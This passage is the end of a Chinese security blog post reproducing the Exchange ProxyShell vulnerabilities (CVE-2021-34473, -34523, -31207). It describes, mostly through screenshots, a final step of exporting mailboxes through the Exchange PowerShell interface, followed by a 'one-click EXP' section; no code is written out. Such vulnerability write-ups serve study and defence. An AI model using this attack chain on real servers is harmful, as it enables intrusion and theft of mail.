</code></pre><p><img data-src="https://img-blog.csdnimg.cn/img_convert/61ac088898c857ff800bb83c2c1a14c7.png" alt="ee7a2521-4bfe-430f-8496-6fc86ad8ab68-图片.png"></p><p><img data-src="https://img-blog.csdnimg.cn/img_convert/092c5cd1cde48916e9c9c833588dc20d.png" alt="efb88815-ea86-4c81-9d62-5f9ef63f1aed-图片.png"></p><p>最后就是调用 exchange powershell 接口，将邮件保存到本地中，这里就涉及到 WsMan 协议了，用脚本跑即可<br><img data-src="https://img-blog.csdnimg.cn/img_convert/fab3ded748068e7db70c1e3604098f65.png" alt="f6d96f7e-81de-45c1-a47e-c9fa66b28718-图片.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/d79f0a6fd26179129cf160408059f608.png" alt="30239ea0-0364-474c-be56-599b05d7c902-图片.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/9c52bf38369db5664406eabb15ae57be.png" alt="269f4271-dde9-43e8-8069-cf748c8a89e3-图片.png"></p><h2 id="exp一键式操作"><a class="anchor" href="#exp一键式操作">#</a> EXP 一键式操作</h2><p><img data-src="https://img-blog.csdnimg.cn/img_convert/42bd5d57400ed111cbfe70439dbef59c.png" alt="f8a35282-73e8-4890-b87d-12afde102e6e-图片.png"></p></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2021-12-08 12:39:05" itemprop="dateModified" datetime="2021-12-08T12:39:05+08:00">2021-12-08</time> </span><span id="2021/10/09/Exchange Proxyshell/" class="item leancloud_visitors" data-flag-title="Exchange Proxyshell" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>ruyue <i class="ic i-at"><em>@</em></i>如月专注</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/2021/10/09/Exchange%20Proxyshell/" title="Exchange Proxyshell">http://example.com/2021/10/09/Exchange Proxyshell/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2021/08/27/%E5%88%A9%E7%94%A8DCOM%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ruyueattention&#x2F;ruyueattention.github.io&#x2F;images&#x2F;3.jpg" title="利用DCOM进行横向渗透"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Windows安全</span><h3>利用DCOM进行横向渗透</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E"><span class="toc-number">2.</span> <span class="toc-text">漏洞说明</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf"><span class="toc-number">2.1.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell%E7%AB%AF%E7%82%B9"><span class="toc-number">2.2.</span> <span class="toc-text">PowerShell 端点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cpowershell%E5%91%BD%E4%BB%A4"><span class="toc-number">2.3.</span> <span class="toc-text">执行 PowerShell 命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%91%E9%80%81payload"><span class="toc-number">2.4.</span> <span class="toc-text">发送 Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.5.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="toc-number">3.</span> <span class="toc-text">环境安装</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrfcve-2021-34473"><span class="toc-number">4.</span> <span class="toc-text">SSRF(CVE-2021-34473)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exchange-powershell-backend%E6%8F%90%E6%9D%83-cve-2021-34523"><span class="toc-number">5.</span> <span class="toc-text">Exchange PowerShell BackEnd 提权 (CVE-2021-34523)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E5%90%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2021-31207"><span class="toc-number">6.</span> <span class="toc-text">认证后任意文件写入漏洞（CVE-2021-31207 ）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">6.2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E4%B8%80%E9%94%AE%E5%BC%8F%E6%93%8D%E4%BD%9C"><span class="toc-number">6.3.</span> <span class="toc-text">EXP 一键式操作</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2021/07/21/CVE-2021-1675/" rel="bookmark" title="CVE-2021-1675(Windows Print Spooler权限提升漏洞)">CVE-2021-1675(Windows Print Spooler权限提升漏洞)</a></li><li class="active"><a href="/2021/10/09/Exchange%20Proxyshell/" rel="bookmark" title="Exchange Proxyshell">Exchange Proxyshell</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="ruyue" data-src="/images/avatar.jpg"><p class="name" itemprop="name">ruyue</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">8</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">4</span> <span class="name">分类</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E5%9E%83%E5%9C%BE%E7%AE%B1/" title="分类于 垃圾箱">垃圾箱</a></div><span><a href="/2021/08/19/%E5%A6%82%E4%BD%95%E8%BD%BB%E6%9D%BE%E7%A0%B4%E8%A7%A3%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" title="如何轻松破解前端加密">如何轻松破解前端加密</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Windows%E5%AE%89%E5%85%A8/" title="分类于 Windows安全">Windows安全</a></div><span><a href="/2021/08/27/%E5%88%A9%E7%94%A8DCOM%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/" title="利用DCOM进行横向渗透">利用DCOM进行横向渗透</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Windows%E5%AE%89%E5%85%A8/" title="分类于 Windows安全">Windows安全</a></div><span><a href="/2021/07/26/Windows%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%20/" title="Windows抓取密码">Windows抓取密码</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vlunstack/" title="分类于 Vlunstack">Vlunstack</a></div><span><a href="/2020/10/26/Vlunstack1/" title="Vlunsatck1">Vlunsatck1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="分类于 漏洞复现">漏洞复现</a></div><span><a href="/2021/07/21/CVE-2021-1675/" title="CVE-2021-1675(Windows Print Spooler权限提升漏洞)">CVE-2021-1675(Windows Print Spooler权限提升漏洞)</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="分类于 漏洞复现">漏洞复现</a></div><span><a href="/2021/10/09/Exchange%20Proxyshell/" title="Exchange Proxyshell">Exchange Proxyshell</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Windows%E5%AE%89%E5%85%A8/" title="分类于 Windows安全">Windows安全</a></div><span><a href="/2021/07/26/Windows%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/" title="Windows远程执行命令">Windows远程执行命令</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vlunstack/" title="分类于 Vlunstack">Vlunstack</a></div><span><a href="/2021/01/04/Vlunstack2/" title="Vlunsatck2">Vlunsatck2</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; <span itemprop="copyrightYear">2021</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">ruyue @ 如月专注</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">38k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">35 分钟</span></div><div class="powered-by"></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2021/10/09/Exchange Proxyshell/",favicon:{show:"夺去目光的故事",hide:"蒙上双眼的故事"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->